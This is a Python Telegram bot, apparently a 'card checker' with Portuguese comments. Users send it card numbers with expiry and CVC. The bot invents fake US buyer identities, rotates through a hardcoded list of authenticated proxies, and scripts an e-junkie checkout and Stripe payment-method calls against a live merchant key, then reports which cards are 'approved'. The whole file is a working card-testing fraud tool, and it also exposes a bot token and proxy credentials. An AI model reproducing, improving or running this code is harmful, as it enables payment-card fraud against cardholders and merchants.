import telebot
import requests
import json
import time
import re
import uuid
import random
import os
from urllib.parse import urlparse, parse_qs

# ==============================================================================
#  OMPLACE CHECKER - TELEGRAM BOT VERSION
# ==============================================================================

# --- CONFIGURAÇÕES DO BOT ---
TOKEN = os.getenv("TELEGRAM_TOKEN", "8806372148:AAG5KvpIAcO97IM-A00DfznguWu5eQ5qGp0")
bot = telebot.TeleBot(TOKEN)

# --- CONFIGURAÇÃO DO GRUPO OBRIGATÓRIO ---
CHANNEL_ID = "@DONATESCUENTAS" 

# --- MENSAGEM DE APOIO ---
SUPPORT_MESSAGE = """
💙 **Se este bot já te ajudou...**

Se este bot já te ajudou a conseguir contas, economizar tempo ou encontrar o que precisava, considere apoiar o desenvolvedor.

Sua contribuição ajuda a manter o bot online, adicionar novos recursos e continuar trazendo atualizações para todos.

❤️ **Apoie o desenvolvedor:** **@LIGH7YAGAMI**

📢 **Entre também no nosso grupo oficial:**
https://t.me/DONATESCUENTAS

**Toda ajuda, por menor que seja, faz a diferença. Muito obrigado pelo seu apoio!** 🚀
"""

# ==============================================================================
#  CONFIGURAÇÕES DA LOJA
# ==============================================================================
# Lista de produtos (URL corrigida)
LISTA_PRODUTOS = [
    "https://337212.e-junkie.com/product/1657384?custom=mkt",
]

# Parâmetros fixos do log
STRIPE_PK = "pk_live_UUFYTQ63roIxScFWo9jLfco5"
STRIPE_ACC = "acct_1Rs7pfKxrOb09Lhq"

# ==============================================================================
#  ROTAÇÃO DE PROXIES
# ==============================================================================
LISTA_PROXIES = [
    "31.59.20.176:6754:ryiergqn:7sqst1e51pb7",
    "31.56.127.193:7684:ryiergqn:7sqst1e51pb7",
    "45.38.107.97:6014:ryiergqn:7sqst1e51pb7",
    "198.105.121.200:6462:ryiergqn:7sqst1e51pb7",
    "64.137.96.74:6641:ryiergqn:7sqst1e51pb7",
    "198.23.243.226:6361:ryiergqn:7sqst1e51pb7",
    "38.154.185.97:6370:ryiergqn:7sqst1e51pb7",
    "84.247.60.125:6095:ryiergqn:7sqst1e51pb7",
    "142.111.67.146:5611:ryiergqn:7sqst1e51pb7",
    "191.96.254.138:6185:ryiergqn:7sqst1e51pb7",
]

PROXY_INDEX = 0

def get_proxy():
    """Retorna o próximo proxy na rotação"""
    global PROXY_INDEX
    proxy_raw = LISTA_PROXIES[PROXY_INDEX % len(LISTA_PROXIES)]
    PROXY_INDEX += 1
    parts = proxy_raw.split(':')
    proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return {"http": proxy_url, "https": proxy_url}, proxy_raw

# ==============================================================================
#  INDICADORES DE APROVAÇÃO
# ==============================================================================
APPROVED_INDICATORS = [
    "Your card's security code is incorrect.",
    "incorrect_cvc",
    "AuthorizeResult",
    "Approved",
    "Transaction Authorized",
    "succeeded",
    "authorized",
    "requires_capture",
    "processing",
    "pass",
    "insufficient_funds",
    "charge.succeeded",
    "stripe:success",
]

# ==============================================================================
#  FUNÇÕES AUXILIARES
# ==============================================================================
def is_user_member(user_id):
    """Verifica se o usuário está no grupo obrigatório"""
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        if status in ['creator', 'administrator', 'member']:
            return True
        return False
    except Exception as e:
        print(f"Erro ao verificar membro: {e}")
        return False

def generate_full_identity():
    first_names = ["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"]
    last_names  = ["Souza", "Silva", "Santos", "Oliveira", "Pereira", "Lima", "Costa", "Ferreira", "Rodrigues", "Almeida"]
    domains     = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com", "icloud.com"]
    addresses = [
        {"street": "1050 S Flower St", "city": "Los Angeles", "state": "CA", "zip": "90015"},
        {"street": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606"},
        {"street": "1097 Howard St", "city": "San Francisco", "state": "CA", "zip": "94103"},
        {"street": "1720 2nd Ave", "city": "New York", "state": "NY", "zip": "10128"},
        {"street": "2101 4th Ave", "city": "Seattle", "state": "WA", "zip": "98121"}
    ]
    first = random.choice(first_names)
    last  = random.choice(last_names)
    addr  = random.choice(addresses)
    email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@{random.choice(domains)}"
    return {
        "first_name": first, "last_name": last, "full_name": f"{first} {last}",
        "email": email, "address": addr["street"], "city": addr["city"], 
        "state": addr["state"], "zip": addr["zip"], "phone": f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}",
        "company": f"{last} Solutions Inc.", "country": "US"
    }

def extract_ids_from_url(url):
    try:
        match = re.search(r'https://(\d+)\.e-junkie\.com/product/(\d+)', url)
        if match: return match.group(1), match.group(2)
        parsed = urlparse(url)
        cl = parse_qs(parsed.query).get('cl', [None])[0]
        i = parse_qs(parsed.query).get('i', [None])[0]
        return cl, i
    except:
        return None, None

def check_card(card_data):
    """Verifica um cartão e retorna o resultado formatado"""
    try:
        parts = card_data.strip().split('|')
        if len(parts) < 4:
            return f"❌ Formato inválido ➔ {card_data}"
        cc_num, cc_month, cc_year, cc_cvv = parts[0], parts[1], parts[2], parts[3]
        if len(cc_year) == 2: cc_year = "20" + cc_year
    except:
        return f"❌ Erro nos dados ➔ {card_data}"

    # Seleciona produto aleatório da lista
    target_url = random.choice(LISTA_PRODUTOS)
    client_id, item_id = extract_ids_from_url(target_url)
    identity = generate_full_identity()

    # Rotação de Proxy
    proxy, proxy_raw = get_proxy()
    proxy_ip = proxy_raw.split(':')[0]

    session = requests.Session()
    session.proxies = proxy
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"

    try:
        # 1. Handshake (Gera cart_id)
        init_url = f"https://www.e-junkie.com/ecom/gbv3.php?c=cart&ejc=2&cl={client_id}&i={item_id}&add=1&initialize=1"
        headers_init = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': target_url,
            'user-agent': ua
        }
        resp_init = session.get(init_url, headers=headers_init, timeout=30, proxies=proxy)

        cart_id_match = re.search(r'cart_id["\']?\s*[:=]\s*["\']?(\d+)', resp_init.text)
        cart_md5_match = re.search(r'cart_md5["\']?\s*[:=]\s*["\']?([a-f0-9]{32})', resp_init.text)

        if not cart_id_match: cart_id_match = re.search(r'cart_id=(\d+)', resp_init.url)
        if not cart_md5_match: cart_md5_match = re.search(r'cart_md5=([a-f0-9]{32})', resp_init.url)

        if not cart_id_match:
            cart_id = session.cookies.get('ej_cart_id')
            cart_md5 = session.cookies.get('ej_cart_md5')
        else:
            cart_id = cart_id_match.group(1)
            cart_md5 = cart_md5_match.group(1)

        if not cart_id:
            return f"❌ Erro Cart ID ➔ {card_data}"

        # 2. Registrar Atividade (cc_activity.php)
        referer_url = f"https://www.e-junkie.com/ecom/ccv3/?client_id={client_id}&cart_id={cart_id}&cart_md5={cart_md5}&initialize"
        headers_act = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.e-junkie.com',
            'referer': referer_url,
            'user-agent': ua
        }
        data_act = {
            'cart_id': cart_id, 'same_s_b': '1', 'b_email': identity['email'], 'b_name': identity['full_name'],
            'b_company': identity['company'], 'b_phone': identity['phone'], 'payment_initiated': 'false', 'save_activity': '1',
            'b_address1': identity['address'], 'b_city': identity['city'], 'b_country': identity['country'],
            'b_state': identity['state'], 'b_postcode': identity['zip']
        }
        session.post('https://www.e-junkie.com/ecom/cc_activity.php', headers=headers_act, data=data_act, timeout=15, proxies=proxy)

        # 3. Tokenização Stripe
        muid = str(uuid.uuid4())
        sid  = str(uuid.uuid4())

        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua
        }
        data_stripe = {
            'type': 'card',
            'card[number]': cc_num,
            'card[cvc]': cc_cvv,
            'card[exp_month]': cc_month,
            'card[exp_year]': cc_year,
            'guid': str(uuid.uuid4()),
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; card-element',
            'key': STRIPE_PK,
            '_stripe_account': STRIPE_ACC,
        }
        resp_stripe = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=25, proxies=proxy)

        if resp_stripe.status_code != 200:
            err = resp_stripe.json().get('error', {}).get('message', 'Erro Stripe')
            return f"❌ Reprovado (Stripe) ➔ {card_data} ➔ {err} | Proxy: {proxy_ip}"

        pm_id = resp_stripe.json().get('id')

        # 4. Checkout Final (stripeValidate.php)
        headers_val = {
            'content-type': 'application/json',
            'origin': 'https://www.e-junkie.com',
            'referer': referer_url,
            'user-agent': ua
        }
        payload_val = {
            "payment_method_id": pm_id, "cart_id": cart_id, "cart_md5": cart_md5,
            "first_name": identity['first_name'], "last_name": identity['last_name'], "email": identity['email']
        }
        resp_val = session.post('https://www.e-junkie.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php', 
                                headers=headers_val, json=payload_val, timeout=35, proxies=proxy)

        try:
            resp_json = resp_val.json()
            site_msg = resp_json.get('message') or resp_json.get('error') or resp_json.get('msg') or resp_val.text[:100]
            resp_text = json.dumps(resp_json)
        except:
            site_msg = resp_val.text[:100]
            resp_text = resp_val.text

        if any(ind.lower() in resp_text.lower() for ind in APPROVED_INDICATORS):
            return f"✅ Aprovado! ➔ {card_data} ➔ {site_msg} | Proxy: {proxy_ip}"
        else:
            return f"❌ Reprovado ➔ {card_data} ➔ {site_msg} | Proxy: {proxy_ip}"

    except Exception as e:
        return f"⚠️ Erro de Conexão ➔ {card_data} ➔ {str(e)} | Proxy: {proxy_ip}"


# ==============================================================================
#  HANDLERS DO TELEGRAM BOT
# ==============================================================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_user_member(message.from_user.id):
        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
        return
    bot.reply_to(message, "🚀 **Bot OMPLACE Online!**\n\nEnvie sua lista no formato:\n`NUMERO|MES|ANO|CVC` (um por linha)", parse_mode="Markdown")

@bot.message_handler(commands=['chk'])
def chk_cards(message):
    if not is_user_member(message.from_user.id):
        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
        return

    msg_text = message.text.replace('/chk', '').strip()
    if not msg_text:
        bot.reply_to(message, "❌ Use: `/chk NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
        return

    cards = msg_text.split('\n')
    status_msg = bot.reply_to(message, f"⏳ Processando {len(cards)} cartões...")
    
    results = []
    for i, card in enumerate(cards):
        if not card.strip(): continue
        res = check_card(card)
        results.append(f"💳 `{card.strip()}`\nResult: {res}")
        
        if (i + 1) % 2 == 0 or (i + 1) == len(cards):
            full_res = "📊 **Resultados:**\n\n" + "\n\n".join(results)
            try:
                bot.edit_message_text(full_res, message.chat.id, status_msg.message_id, parse_mode="Markdown")
            except:
                pass
        time.sleep(2)

@bot.message_handler(func=lambda message: True)
def auto_chk(message):
    if '|' in message.text:
        if not is_user_member(message.from_user.id):
            bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
            return
        chk_cards(message)

# ==============================================================================
#  MAIN
# ==============================================================================
if __name__ == "__main__":
    print("Bot iniciado com rotação de proxies...")
    bot.infinity_polling()
